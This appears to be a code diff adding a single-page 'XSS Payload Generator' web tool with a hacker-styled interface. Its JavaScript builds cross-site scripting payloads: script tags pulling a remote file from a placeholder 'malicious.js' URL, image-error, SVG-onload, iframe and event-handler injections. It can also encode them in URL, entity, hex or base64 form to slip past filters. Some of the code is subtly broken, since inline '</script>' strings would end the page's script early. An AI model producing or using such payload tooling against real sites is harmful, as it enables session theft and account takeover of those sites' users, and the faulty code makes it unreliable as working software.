@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>XSS Payload Generator</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    video#bg-video {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw; min-height: 100vh;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.25;
+    }
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      padding: 25px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+    h1, label {
+      color: #c58b00;
+      text-shadow: 1px 1px 3px black;
+    }
+    input[type="text"], textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.3);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    button {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid #c58b00;
+      color: #c58b00;
+      padding: 10px 15px;
+      margin: 5px 5px 15px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: red;
+    }
+    pre {
+      white-space: pre-wrap;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px solid red;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      max-height: 340px;
+      overflow-y: auto;
+    }
+    .history { margin-top: 20px; }
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ff8800;
+    }
+    .hint { font-size: 0.88rem; opacity: 0.9; color: #ffb74d; }
+    .payload-preview {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px dashed #c58b00;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      min-height: 80px;
+    }
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      .row { grid-template-columns: 1fr; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="background/1761817527453041720p.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+  <!-- Background Music -->
+  <audio id="bg-music" loop>
+    <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg" />
+    Your browser does not support the audio tag.
+  </audio>
+  <div class="container">
+    <h1>🛡️ XSS Payload Generator</h1>
+    <label>Payload Type:</label>
+    <select id="payload-type">
+      <option value="script">Script Tag</option>
+      <option value="img">Image Tag</option>
+      <option value="svg">SVG</option>
+      <option value="iframe">iFrame</option>
+      <option value="input">Input Field</option>
+      <option value="body">Body Onload</option>
+      <option value="event">Event Handler</option>
+      <option value="encoded">Encoded</option>
+    </select>
+    <label>Custom Code (JavaScript):</label>
+    <textarea id="custom-code" rows="4" placeholder="alert('XSS');">alert('XSS');</textarea>
+    <div class="row">
+      <div>
+        <label>Target Attribute:</label>
+        <input type="text" id="target-attr" placeholder="onerror, onload, etc." />
+      </div>
+      <div>
+        <label>Custom URL:</label>
+        <input type="text" id="custom-url" placeholder="https://example.com/malicious.js" />
+      </div>
+    </div>
+    <label>Encoding:</label>
+    <select id="encoding">
+      <option value="none">None</option>
+      <option value="url">URL Encode</option>
+      <option value="html">HTML Entity Encode</option>
+      <option value="hex">Hex Encode</option>
+      <option value="base64">Base64 Encode</option>
+    </select>
+    <div class="row">
+      <button onclick="generatePayload()">Generate Payload</button>
+      <button onclick="testPayload()">Test Payload</button>
+    </div>
+    <div class="row">
+      <button onclick="copyPayload()">Copy Payload</button>
+      <button onclick="clearAll()">Clear</button>
+    </div>
+    <div class="hint">Note: Test payloads in a safe environment. Never use on production systems without permission.</div>
+    <label>Generated Payload:</label>
+    <div id="payload-preview" class="payload-preview">No payload generated yet...</div>
+    <label>Result:</label>
+    <pre id="result-box">No result yet...</pre>
+    <div class="history">
+      <h3>History</h3>
+      <div id="history-box"></div>
+    </div>
+  </div>
+  <script>
+    const music = document.getElementById("bg-music");
+    const resultBox = document.getElementById("result-box");
+    const historyBox = document.getElementById("history-box");
+    const payloadPreview = document.getElementById("payload-preview");
+    let history = [];
+    let currentPayload = "";
+    
+    window.addEventListener('click', () => {
+      music.play().catch(() => {});
+    }, { once: true });
+    
+    function generatePayload() {
+      const type = document.getElementById("payload-type").value;
+      const code = document.getElementById("custom-code").value || "alert('XSS');";
+      const attr = document.getElementById("target-attr").value || "onerror";
+      const url = document.getElementById("custom-url").value;
+      const encoding = document.getElementById("encoding").value;
+      
+      let payload = "";
+      
+      switch(type) {
+        case "script":
+          payload = url ? `<script src="${url}"></script>` : `<script>${code}</script>`;
+          break;
+        case "img":
+          payload = `<img src=x ${attr}="${code}">`;
+          break;
+        case "svg":
+          payload = `<svg onload="${code}"></svg>`;
+          break;
+        case "iframe":
+          payload = url ? `<iframe src="${url}"></iframe>` : `<iframe src="javascript:${code}"></iframe>`;
+          break;
+        case "input":
+          payload = `<input type="text" value="" ${attr}="${code}">`;
+          break;
+        case "body":
+          payload = `<body onload="${code}">`;
+          break;
+        case "event":
+          payload = `<div ${attr}="${code}">Click me</div>`;
+          break;
+        case "encoded":
+          payload = encodePayload(code, encoding);
+          break;
+        default:
+          payload = `<script>${code}</script>`;
+      }
+      
+      // Apply additional encoding if selected
+      if (encoding !== "none" && type !== "encoded") {
+        payload = encodePayload(payload, encoding);
+      }
+      
+      currentPayload = payload;
+      payloadPreview.innerHTML = escapeHtml(payload);
+      resultBox.textContent = `Payload generated: ${type}\nEncoding: ${encoding}`;
+      logHistory(`Generated ${type} payload`, payload.substring(0, 50));
+    }
+    
+    function encodePayload(payload, encodingType) {
+      switch(encodingType) {
+        case "url":
+          return encodeURIComponent(payload);
+        case "html":
+          return payload.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
+        case "hex":
+          return payload.split('').map(c => c.charCodeAt(0).toString(16)).join('');
+        case "base64":
+          return btoa(payload);
+        default:
+          return payload;
+      }
+    }
+    
+    function testPayload() {
+      if (!currentPayload) {
+        resultBox.textContent = "❌ Generate a payload first!";
+        return;
+      }
+      
+      // Create a test HTML page with the payload
+      const testPage = `
+        <!DOCTYPE html>
+        <html>
+        <head><title>XSS Test</title></head>
+        <body>
+          <h2>XSS Payload Test</h2>
+          <div id="test-area"></div>
+          <script>
+            // Safely insert the payload
+            document.getElementById('test-area').innerHTML = \`${escapeHtml(currentPayload)}\`;
+          </script>
+        </body>
+        </html>
+      `;
+      
+      // Open in a new window
+      const testWindow = window.open('', '_blank');
+      testWindow.document.write(testPage);
+      testWindow.document.close();
+      
+      resultBox.textContent = "Payload test opened in new window";
+      logHistory("Tested payload", currentPayload.substring(0, 50));
+    }
+    
+    function copyPayload() {
+      if (!currentPayload) {
+        resultBox.textContent = "❌ Generate a payload first!";
+        return;
+      }
+      
+      navigator.clipboard.writeText(currentPayload).then(() => {
+        resultBox.textContent = "✅ Payload copied to clipboard!";
+        logHistory("Copied payload", currentPayload.substring(0, 50));
+      }).catch(err => {
+        resultBox.textContent = `❌ Failed to copy: ${err}`;
+      });
+    }
+    
+    function clearAll() {
+      document.getElementById("payload-type").value = "script";
+      document.getElementById("custom-code").value = "alert('XSS');";
+      document.getElementById("target-attr").value = "";
+      document.getElementById("custom-url").value = "";
+      document.getElementById("encoding").value = "none";
+      payloadPreview.textContent = "No payload generated yet...";
+      resultBox.textContent = "No result yet...";
+      currentPayload = "";
+    }
+    
+    function logHistory(action, snippet) {
+      const time = new Date().toLocaleTimeString();
+      const line = `${time} - ${action}: ${snippet}`;
+      history.unshift(line);
+      updateHistory();
+    }
+    
+    function updateHistory() {
+      historyBox.innerHTML = "";
+      history.slice(0, 8).forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "history-item";
+        div.textContent = entry;
+        historyBox.appendChild(div);
+      });
+    }
+    
+    function escapeHtml(unsafe) {
+      return unsafe
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+  </script>
+</body>
+</html>
